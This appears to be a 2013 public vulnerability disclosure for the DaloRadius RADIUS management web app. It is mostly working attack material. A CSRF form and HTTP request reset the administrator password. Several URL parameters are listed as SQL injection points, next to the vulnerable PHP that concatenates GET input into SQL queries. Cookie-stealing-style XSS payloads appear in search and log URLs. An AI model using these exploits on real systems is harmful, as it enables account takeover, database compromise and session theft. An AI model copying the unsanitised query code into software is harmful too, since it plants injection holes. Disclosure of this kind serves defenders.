@@ -1,0 +1,98 @@
+-------------------------------------------------------------------------
+# Software      : DaloRadius    SQLi / CSRF / XSS                                                                                                            
+# Author        : Saadat Ullah , saadi_linux@rocketmail.com                               
+# Author home	: http://security-geeks.blogspot.com
+# Date          : 15/3/13   
+# Vendors	: http://www.daloradius.com/ 
+# Download Link : http://sourceforge.net/projects/daloradius/   
+                                                                                     
+-------------------------------------------------------------------------
++---+[ CSRF Change Admin Password ]+---+
+
+DaloRadius Is not Using Any Security Tokens To Protect Againts CRSF.It is vuln to CRSF on All Locations.
+Some OF them..
+Change Admin Password
+
+<form action="daloradius/config-operators-edit.php" method="post">
+				<input type="hidden" value="administrator" name="operator_username" />
+
+<div class="tabber">
+
+     <div class="tabbertab" title="Operator Info">
+
+	<fieldset>
+	
+		<h302></h302>
+		<br/>
+
+                <label for='operator_password' class='form'></label>
+                <input name='password' id='password'
+		type='hidden'			value='radius1' tabindex=101 />
+                <br/>
+
+                <br/><br/>
+                <hr><br/>
+
+                <input type='submit' name='submit' value='Apply' class='button' />
+
+Poc
+Header
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://localhost/daloradius/config-operators-edit.php?operator_username=administrator
+Cookie: PHPSESSID=5f528764d624db129645be2e9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3540
+
+Post Data:
+operator_username=administrator&password=radius1&submit=Apply
+
++---+[ SQL Injection ]+---+
+
+Their are multiple SQLI in the script some are..
+http://localhost/daloradius/acct-ipaddress.php?orderBy=[SQLi]
+http://localhost/daloradius/acct-ipaddress.php?ipaddress=[SQLi]
+http://localhost/daloradius/acct-date.php?orderBy=[SQLi]
+http://localhost/daloradius/acct-date.php?username=[SQLi] etc
+
+Proof Of Concept
+in acct-ipaddress.php
+
+isset($_GET['orderBy']) ? $orderBy = $_GET['orderBy'] : $orderBy = "radacctid";
+	isset($_GET['orderType']) ? $orderType = $_GET['orderType'] : $orderType = "asc";	
+
+
+	isset($_GET['ipaddress']) ? $ipaddress = $_GET['ipaddress'] : $ipaddress = "";
+
+	.
+	.
+	.
+ $sql = "SELECT ".$configValues['CONFIG_DB_TBL_RADACCT'].".RadAcctId, ".$configValues['CONFIG_DB_TBL_DALOHOTSPOTS'].".name as hotspot, ".$configValues['CONFIG_DB_TBL_RADACCT'].".UserName, radacct.FramedIPAddress, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctStartTime, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctStopTime, radacct.AcctSessionTime, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctInputOctets, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctOutputOctets, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctTerminateCause, ".$configValues['CONFIG_DB_TBL_RADACCT'].".NASIPAddress FROM ".$configValues['CONFIG_DB_TBL_RADACCT']." LEFT JOIN ".$configValues['CONFIG_DB_TBL_DALOHOTSPOTS']." ON ".$configValues['CONFIG_DB_TBL_RADACCT'].".calledstationid = ".$configValues['CONFIG_DB_TBL_DALOHOTSPOTS'].".mac WHERE FramedIPAddress='$ipaddress';";
+
+
+In acct-date.php
+if ( (isset($_GET['username'])) && ($_GET['username']) ) {
+		$username = $_GET['username'];
+
+
+
+  $sql = "SELECT ".$configValues['CONFIG_DB_TBL_RADACCT'].".RadAcctId, ".$configValues['CONFIG_DB_TBL_DALOHOTSPOTS'].".name as hotspot, ".$configValues['CONFIG_DB_TBL_RADACCT'].".UserName, ".$configValues['CONFIG_DB_TBL_RADACCT'].".FramedIPAddress, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctStartTime, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctStopTime, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctSessionTime, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctInputOctets, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctOutputOctets, ".$configValues['CONFIG_DB_TBL_RADACCT'].".AcctTerminateCause, ".$configValues['CONFIG_DB_TBL_RADACCT'].".NASIPAddress FROM ".$configValues['CONFIG_DB_TBL_RADACCT']." LEFT JOIN ".$configValues['CONFIG_DB_TBL_DALOHOTSPOTS']." ON ".$configValues['CONFIG_DB_TBL_RADACCT'].".calledstationid = ".$configValues['CONFIG_DB_TBL_DALOHOTSPOTS'].".mac WHERE AcctStartTime>'$startdate' and AcctStartTime<'$enddate' and UserName like '$username';";
+
+
+
++---+[ XSS ]+---+
+http://localhost/daloradius/rep-logs-daloradius.php?daloradiusLineCount=50&daloradiusFilter=<script>alert(document.cookie);</script>
+http://localhost/daloradius/mng-search.php?username=<script>alert(document.cookie);</script>
+
+#Independent Pakistani Security Researcher
+
+
+
+
+
+
+
